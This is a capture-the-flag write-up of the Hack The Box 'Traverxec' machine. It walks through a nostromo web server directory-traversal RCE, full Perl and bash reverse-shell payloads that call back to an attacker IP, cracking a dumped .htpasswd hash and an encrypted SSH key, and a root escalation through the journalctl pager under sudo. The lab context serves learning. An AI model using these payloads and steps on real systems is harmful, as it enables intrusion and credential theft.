# recon
pymap
```
22/tcp open  ssh     OpenSSH 7.9p1 Debian 10+deb10u1 (protocol 2.0)
| ssh-hostkey: 
|   2048 aa:99:a8:16:68:cd:41:cc:f9:6c:84:01:c7:59:09:5c (RSA)
|   256 93:dd:1a:23:ee:d7:1f:08:6b:58:47:09:73:a3:88:cc (ECDSA)
|_  256 9d:d6:62:1e:7a:fb:8f:56:92:e6:37:f1:10:db:9b:ce (ED25519)


PORT   STATE SERVICE VERSION
80/tcp open  http    nostromo 1.9.6
|_http-server-header: nostromo 1.9.6
|_http-title: TRAVERXEC
```
- on the web we found out that the owner of the site is  **David White**
- 
```console
$ searchsploit nostro
---------------------------------------------------------------------------- ---------------------------------
 Exploit Title                                                              |  Path
---------------------------------------------------------------------------- ---------------------------------
Nostromo - Directory Traversal Remote Command Execution (Metasploit)        | multiple/remote/47573.rb
nostromo 1.9.6 - Remote Code Execution                                      | multiple/remote/47837.py
nostromo nhttpd 1.9.3 - Directory Traversal Remote Command Execution        | linux/remote/35466.sh
---------------------------------------------------------------------------- ---------------------------------
```
in metasploit module 
```
 This module exploits a remote command execution vulnerability in
        Nostromo <= 1.9.6. This issue is caused by a directory traversal
        in the function `http_verify` in nostromo nhttpd allowing an attacker
        to achieve remote code execution via a crafted HTTP request.
```
seem like this will work prefect for us. But this time we will do something different. we will try to understand the expolit via Burp suit and just use the `msfconsole`. To check the src code I ran `searchsploit -x multiple/remote/47573.rb`
```rb
def execute_command(cmd, opts = {})
    send_request_cgi({
      'method'  => 'POST',
      'uri'     => normalize_uri(target_uri.path, '/.%0d./.%0d./.%0d./.%0d./bin/sh'),
      'headers' => {'Content-Length:' => '1'},
      'data'    => "echo\necho\n#{cmd} 2>&1"
      }
    )
```
so it send a post request to `/.%0d./.%0d./.%0d./.%0d./bin/sh` and then `echo\necho\n#{cmd} 2>&1` I guess cmd is the reverse shell payload. in msfconsole run 
```
msf5 exploit(multi/http/nostromo_code_exec) > set proxies http:127.0.0.1:8080
proxies => http:127.0.0.1:8080
msf5 exploit(multi/http/nostromo_code_exec) > run

[*] Started reverse TCP handler on 10.10.14.43:4444 
[-] Exploit aborted due to failure: not-vulnerable: Set ForceExploit to override
[*] Exploit completed, but no session was created.
msf5 exploit(multi/http/nostromo_code_exec) > set ForceExploit true 
ForceExploit => true
```
to send the payload to `burp suite`. now set all requried option and fire and `set ForceExploit true`!
```
POST /.%0d./.%0d./.%0d./.%0d./bin/sh HTTP/1.1
Host: 10.10.10.165
User-Agent: Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1)
Content-Length: 245
Content-Type: application/x-www-form-urlencoded
Content-Length: 245
Connection: close

echo
echo
perl -MIO -e '$p=fork;exit,if($p);foreach my $key(keys %ENV){if($ENV{$key}=~/(.*)/){$ENV{$key}=$1;}}$c=new IO::Socket::INET(PeerAddr,"10.10.14.43:4444");STDIN->fdopen($c,r);$~->fdopen($c,w);while(<>){if($_=~ /(.*)/){system $1;}};' 2>&1
```
The pay load was a pearl reverse shell executed using `/bin/sh`. let go classic way uing bash and bash payload!!
```
POST /.%0d./.%0d./.%0d./.%0d./bin/bash HTTP/1.1
Host: 10.10.10.165
User-Agent: Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1)
Content-Length: 245
Content-Type: application/x-www-form-urlencoded
Content-Length: 245
Connection: close

echo
echo
bash -i >& /dev/tcp/10.10.14.43/6969 0>&1
```
and boom! it works!! ofc...
```
$ nc -nlvp 6969
listening on [any] 6969 ...
connect to [10.10.14.43] from (UNKNOWN) [10.10.10.165] 55872
bash: cannot set terminal process group (419): Inappropriate ioctl for device
bash: no job control in this shell
www-data@traverxec:/usr/bin$ 
```
# user
```console
www-data@traverxec:/usr/bin$ whoami
whoami
www-data
www-data@traverxec:/usr/bin$ cd 
cd
bash: cd: HOME not set
www-data@traverxec:/usr/bin$ find / -name nostromo 2> /dev/null
find / -name nostromo 2> /dev/null
/var/nostromo
www-data@traverxec:/usr/bin$ cd /var/nostromo
www-data@traverxec:/var/nostromo$ python -c "import pty; pty.spawn('/bin/bash')"
<omo$ python -c "import pty; pty.spawn('/bin/bash')"
www-data@traverxec:/var/nostromo$ ^Z
zsh: suspended  nc -nlvp 6969
                                                                                                
┌──(kali㉿kali)-[~]
└─$ stty raw -echo;fg                                                                 148 ⨯ 1 ⚙
[1]  + continued  nc -nlvp 6969

www-data@traverxec:/var/nostromo$ export TERM=xterm
www-data@traverxec:/var/nostromo$ ls
conf  htdocs  icons  logs
www-data@traverxec:/var/nostromo$ cd conf/
www-data@traverxec:/var/nostromo/conf$ ls
mimes  nhttpd.conf
www-data@traverxec:/var/nostromo/conf$ cat nhttpd.conf 
# MAIN [MANDATORY]

servername		traverxec.htb
serverlisten		*
serveradmin		david@traverxec.htb
serverroot		/var/nostromo
servermimes		conf/mimes
docroot			/var/nostromo/htdocs
docindex		index.html

# LOGS [OPTIONAL]

logpid			logs/nhttpd.pid

# SETUID [RECOMMENDED]

user			www-data

# BASIC AUTHENTICATION [OPTIONAL]

htaccess		.htaccess
htpasswd		/var/nostromo/conf/.htpasswd

# ALIASES [OPTIONAL]

/icons			/var/nostromo/icons

# HOMEDIRS [OPTIONAL]

homedirs		/home
homedirs_public		public_www
```
why did I chack conf? because it is a configureation files, you always find something useful here. so password is at `/var/nostromo/conf/.htpasswd` and we found a user call `david@traverxec.htb`
```
www-data@traverxec:/var/nostromo/conf$ cat /var/nostromo/conf/.htpasswd
david:$1$e7NfNpNi$A6nCwOTqrNR2oDuIKirRZ/
```
password to crack, Always do it on Colabcat!!. one more thig to note is when a web site have, `david:Nowonly4me`. I tried to ssh into the server with the cred, it didnt work
```
homedirs		/home
homedirs_public		public_www
```
that mean you can access home directory using `traverxec.htb/~`, I tried `traverxec.htb/~david/` and it works but still hit dead end. but **Ippsec** help me out, as always
```
www-data@traverxec:/var/nostromo$ cd /home/david/ 
www-data@traverxec:/home/david$ ls
ls: cannot open directory '.': Permission denied
www-data@traverxec:/home/david$ cd public_www
www-data@traverxec:/home/david/public_www$ ls
index.html  protected-file-area
```
I then visite `/david/public_www/protected-file-area/` it ask for a credential, I gave it `david:Nowonly4me` and we can see the zip file. download + unpack it.
```
[10.10.14.43]-kali@kali:~/HTB/traverexc$ cd home/
[10.10.14.43]-kali@kali:~/HTB/traverexc/home$ ls
david
[10.10.14.43]-kali@kali:~/HTB/traverexc/home$ da
bash: da: command not found
[10.10.14.43]-kali@kali:~/HTB/traverexc/home$ cd david/
[10.10.14.43]-kali@kali:~/HTB/traverexc/home/david$ ls
[10.10.14.43]-kali@kali:~/HTB/traverexc/home/david$ ls -la
total 12
drwxr-xr-x 3 kali kali 4096 Nov 13 18:42 .
drwxr-xr-x 3 kali kali 4096 Nov 13 18:42 ..
drwx------ 2 kali kali 4096 Oct 25  2019 .ssh
[10.10.14.43]-kali@kali:~/HTB/traverexc/home/david$ cd .ssh/
[10.10.14.43]-kali@kali:~/HTB/traverexc/home/david/.ssh$ ls
authorized_keys  id_rsa  id_rsa.pub
[10.10.14.43]-kali@kali:~/HTB/traverexc/home/david/.ssh$ 
```
we found his private key but it is encrypted! let use ssh2john to convert it into hash and use colabcat to crack it again!!
```console
kali@kali:~/HTB/traverexc/home/david/.ssh$ find / -name ssh2john* 2> /dev/null
/usr/share/john/ssh2john.py
kali@kali:~/HTB/traverexc/home/david/.ssh$ /usr/share/john/ssh2john.py id_rsa > dave.txt
```
I dunno why I call him dave... it david lol. I guess coz I know someone irl name dave. After few 2 sec work on `Colabcat` we got the password `hunter`
```console
[10.10.14.43]-kali@kali:~/HTB/traverexc/home/david/.ssh$ ssh david@10.10.10.165 -i id_rsa 
Enter passphrase for key 'id_rsa': 
Linux traverxec 4.19.0-6-amd64 #1 SMP Debian 4.19.67-2+deb10u1 (2019-09-20) x86_64
david@traverxec:~$ cat user.txt 
```

# root
```
david@traverxec:~/bin$ sudo -l
[sudo] password for david: 
Sorry, try again.
[sudo] password for david: 
sudo: 1 incorrect password attempt
david@traverxec:~$ ls
bin  public_www  user.txt
david@traverxec:~$ cd bin/
david@traverxec:~/bin$ ls -la
total 16
drwx------ 2 david david 4096 Oct 25  2019 .
drwx--x--x 5 david david 4096 Oct 25  2019 ..
-r-------- 1 david david  802 Oct 25  2019 server-stats.head
-rwx------ 1 david david  363 Oct 25  2019 server-stats.sh
david@traverxec:~/bin$ cat server-stats.head 
                                                                          .----.
                                                              .---------. | == |
   Webserver Statistics and Data                              |.-"""""-.| |----|
         Collection Script                                    ||       || | == |
          (c) David, 2019                                     ||       || |----|
                                                              |'-.....-'| |::::|
                                                              '"")---(""' |___.|
                                                             /:::::::::::\"    "
                                                            /:::=======:::\
                                                        jgs '"""""""""""""' 

david@traverxec:~/bin$ cat server-stats.
cat: server-stats.: No such file or directory
david@traverxec:~/bin$ cat server-stats.sh 
#!/bin/bash

cat /home/david/bin/server-stats.head
echo "Load: `/usr/bin/uptime`"
echo " "
echo "Open nhttpd sockets: `/usr/bin/ss -H sport = 80 | /usr/bin/wc -l`"
echo "Files in the docroot: `/usr/bin/find /var/nostromo/htdocs/ | /usr/bin/wc -l`"
echo " "
echo "Last 5 journal log lines:"
/usr/bin/sudo /usr/bin/journalctl -n5 -unostromo.service | /usr/bin/cat 
```
okey let look at what we found here.
1. I tired to `sudo -l` with `Notonly4me` it didnt work.
2. `server-stats.sh` which we have read/write/execute permission
3. the script is execute `journalctl` using `sudo`

I googling `journalctl` on [GTFObins](https://gtfobins.github.io/gtfobins/journalctl/) and yes we can use it for priv esc.
`/usr/bin/sudo /usr/bin/journalctl` and ofc it didnt work... so I gusse I need to modify the script and run the script instead. BUT NOPE we can not modify the file!!! T^T but how can we run the script without the system even asking us about a password? and why do it ask us for password when we ran ``/usr/bin/sudo /usr/bin/journalctl` ...

then it hit me. maybe david is allow to run `/usr/bin/sudo /usr/bin/journalctl -n5 -unostromo.service` but not what we executed before?
```console
david@traverxec:~/bin$ /usr/bin/sudo /usr/bin/journalctl -n5 -unostromo.service
-- Logs begin at Fri 2020-11-13 17:31:42 EST, end at Fri 2020-11-13 19:32:54 EST. --
Nov 13 17:31:44 traverxec systemd[1]: Starting nostromo nhttpd server...
Nov 13 17:31:44 traverxec nhttpd[422]: started
Nov 13 17:31:44 traverxec nhttpd[422]: max. file descriptors = 1040 (cur) / 1040 (max)
Nov 13 17:31:44 traverxec systemd[1]: Started nostromo nhttpd server.
david@traverxec:~/bin$ 
```
back to GTFObins "This invokes the default pager, which is likely to be `less`, other functions may apply." less will only be use when the termial is smaller than the output. I hade my terminal full size which is why less didnt triggered when I execute the command.


now let make it smaller!
```
david@traverxec:~/bin$ /usr/bin/sudo /usr/bin/journalctl -n5 -unostromo.service
-- Logs begin at Fri 2020-11-13 17:31:42 EST, end at Fri 2020-11-13 19:34:12 EST. --
Nov 13 17:31:44 traverxec systemd[1]: Starting nostromo nhttpd server...
Nov 13 17:31:44 traverxec nhttpd[422]: started
!/bin/bash
root@traverxec:/home/david/bin# cat /root/root.txt
```
boom we got root!!